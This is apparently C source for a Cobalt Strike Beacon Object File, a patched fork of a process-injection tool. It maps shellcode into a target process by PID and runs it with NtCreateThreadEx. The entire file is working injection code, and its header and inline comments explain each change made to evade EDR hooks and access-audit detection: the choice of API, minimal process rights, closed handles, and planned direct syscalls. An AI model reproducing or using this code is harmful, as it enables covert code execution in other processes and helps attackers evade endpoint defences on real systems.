/*
 * secinject.c — Section-mapping process injection BOF
 *
 * Patched fork of https://github.com/apokryptein/secinject
 * Applied surgical OPSEC + robustness patches:
 *   [1] CreateRemoteThread   → NtCreateThreadEx
 *   [3] PROCESS_ALL_ACCESS   → minimal target rights (0x100A)
 *   [4] handle leaks         → close hRemoteProcess and hThread
 *   [5] error checks         → OpenProcess, NtCreateThreadEx, cascading
 *
 * Deliberately NOT patched:
 *   [2] Section allocated PAGE_EXECUTE_READWRITE — required so we can hold
 *       both a local RW view (for memcpy) and a remote RX view (for the
 *       thread start). Section-level protection is a ceiling for its views;
 *       any narrower section would prevent one of the two mappings.
 *   [10] Userland ntdll calls (no SysWhispers) — on the roadmap for a
 *       follow-up patch; a direct-syscall stub set replaces every NTDLL$*
 *       call with an inline `mov eax, ssn / syscall` shim.
 */

#include <stdio.h>
#include <windows.h>
#include "beacon.h"
#include "libc.h"

#define NT_SUCCESS 0x00000000

/* Minimum rights we need on the target process:
 *   PROCESS_CREATE_THREAD             (0x0002) — NtCreateThreadEx target
 *   PROCESS_VM_OPERATION              (0x0008) — NtMapViewOfSection target
 *   PROCESS_QUERY_LIMITED_INFORMATION (0x1000) — kernel does an internal
 *                                                query during map + thread
 *                                                creation; without this some
 *                                                Win10+ builds return
 *                                                STATUS_ACCESS_DENIED
 * Total = 0x100A. PROCESS_ALL_ACCESS (0x1FFFFF) — what the upstream BOF
 * requested — is a classic ObjectAccess-audit red flag ("why does rundll32
 * need every right on msedge?"). 0x100A is a much smaller acl footprint.
 */
#define SECINJECT_TARGET_RIGHTS (PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_QUERY_LIMITED_INFORMATION)

WINBASEAPI HANDLE   WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
WINBASEAPI HANDLE   WINAPI KERNEL32$GetCurrentProcess(void);
WINBASEAPI DWORD    WINAPI KERNEL32$GetLastError(void);

NTSYSCALLAPI NTSTATUS WINAPI NTDLL$NtCreateSection(PHANDLE, ACCESS_MASK, PVOID, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
NTSYSAPI     NTSTATUS WINAPI NTDLL$NtMapViewOfSection(HANDLE, HANDLE, PVOID, ULONG, SIZE_T, PLARGE_INTEGER, PSIZE_T, UINT, ULONG, ULONG);
NTSYSAPI     NTSTATUS WINAPI NTDLL$NtUnmapViewOfSection(HANDLE, PVOID);
NTSYSCALLAPI NTSTATUS WINAPI NTDLL$NtClose(HANDLE);

/* NtCreateThreadEx replaces CreateRemoteThread. CreateRemoteThread is the
 * single most heavily EDR-hooked injection API; NtCreateThreadEx sits one
 * layer lower (the ntdll syscall stub rather than the kernel32 wrapper).
 * Same kernel telemetry, different userland hook surface. */
NTSYSCALLAPI NTSTATUS WINAPI NTDLL$NtCreateThreadEx(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);


void go(char * args, int len) {
    datap parser;
    DWORD  procID          = 0;
    int    shellcodeLen    = 0;   /* BeaconDataExtract takes int*; SIZE_T* would truncate on the write. */
    SIZE_T shellcodeSize   = 0;
    char * shellcode       = NULL;

    HANDLE hLocalProcess   = NULL;   /* pseudo-handle; do NOT close */
    HANDLE hRemoteProcess  = NULL;
    HANDLE hSection        = NULL;
    HANDLE hThread         = NULL;
    PVOID  baseAddrLocal   = NULL;
    PVOID  baseAddrRemote  = NULL;

    BeaconDataParse(&parser, args, len);
    procID    = BeaconDataInt(&parser);
    shellcode = BeaconDataExtract(&parser, &shellcodeLen);
    shellcodeSize = (SIZE_T)shellcodeLen;

    LARGE_INTEGER sectionSize;
    sectionSize.QuadPart = (LONGLONG)shellcodeSize;   /* full 64-bit init, not just LowPart */

    hLocalProcess = KERNEL32$GetCurrentProcess();

    /* Patch [3]: minimal rights (was PROCESS_ALL_ACCESS). */
    hRemoteProcess = KERNEL32$OpenProcess(SECINJECT_TARGET_RIGHTS, FALSE, procID);
    if (hRemoteProcess == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[!] OpenProcess(%lu, 0x%x) failed — wrong session, PID gone, or ACL denied. GetLastError=%lu",
                     procID, (unsigned)SECINJECT_TARGET_RIGHTS, KERNEL32$GetLastError());
        return;
    }

    /* Section held RWX so we can map RW locally + RX remotely (see patch
     * [2] note in the file header). Not stealthy against EDRs that hook
     * NtCreateSection specifically on RWX — that's on the roadmap. */
    NTSTATUS res = NTDLL$NtCreateSection(&hSection, GENERIC_ALL, NULL, &sectionSize,
                                          PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if (res != NT_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[!] NtCreateSection failed NTSTATUS=0x%08x", (unsigned)res);
        NTDLL$NtClose(hRemoteProcess);
        return;
    }

    /* Local RW view — we memcpy shellcode here; no WriteProcessMemory. */
    NTSTATUS mapStatusLocal = NTDLL$NtMapViewOfSection(hSection, hLocalProcess,
                                                       &baseAddrLocal, 0, 0,
                                                       NULL, &shellcodeSize,
                                                       2 /* ViewUnmap */, 0,
                                                       PAGE_READWRITE);
    if (mapStatusLocal != NT_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[!] NtMapViewOfSection(local) failed NTSTATUS=0x%08x", (unsigned)mapStatusLocal);
        NTDLL$NtClose(hSection);
        NTDLL$NtClose(hRemoteProcess);
        return;
    }

    /* Remote RX view — target process sees only RX pages from us. */
    NTSTATUS mapStatusRemote = NTDLL$NtMapViewOfSection(hSection, hRemoteProcess,
                                                        &baseAddrRemote, 0, 0,
                                                        NULL, &shellcodeSize,
                                                        2 /* ViewUnmap */, 0,
                                                        PAGE_EXECUTE_READ);
    if (mapStatusRemote != NT_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[!] NtMapViewOfSection(remote) failed NTSTATUS=0x%08x", (unsigned)mapStatusRemote);
        NTDLL$NtUnmapViewOfSection(hLocalProcess, baseAddrLocal);
        NTDLL$NtClose(hSection);
        NTDLL$NtClose(hRemoteProcess);
        return;
    }

    /* Copy shellcode via the local RW view — no cross-process write. */
    mycopy(baseAddrLocal, shellcode, (int)shellcodeSize);

    /* Unmap the local view so the shellcode isn't sitting in beacon's own
     * address space after this call returns. */
    NTDLL$NtUnmapViewOfSection(hLocalProcess, baseAddrLocal);

    /* Section handle can drop now — both mapped views hold refs and keep
     * the underlying section alive until they themselves unmap. */
    NTDLL$NtClose(hSection);

    /* Patch [1]: NtCreateThreadEx (was CreateRemoteThread). */
    NTSTATUS threadStatus = NTDLL$NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS,
                                                    NULL, hRemoteProcess,
                                                    baseAddrRemote, NULL,
                                                    0, 0, 0, 0, NULL);
    if (threadStatus != NT_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[!] NtCreateThreadEx failed NTSTATUS=0x%08x", (unsigned)threadStatus);
        NTDLL$NtUnmapViewOfSection(hRemoteProcess, baseAddrRemote);
        NTDLL$NtClose(hRemoteProcess);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Injected %d bytes into PID %lu via section mapping (thread=0x%p)",
                 shellcodeLen, procID, hThread);

    /* Patch [4]: close both handles — no inter-process handle correlation
     * trail. Upstream leaked both hRemoteProcess and hThread. */
    NTDLL$NtClose(hThread);
    NTDLL$NtClose(hRemoteProcess);
}
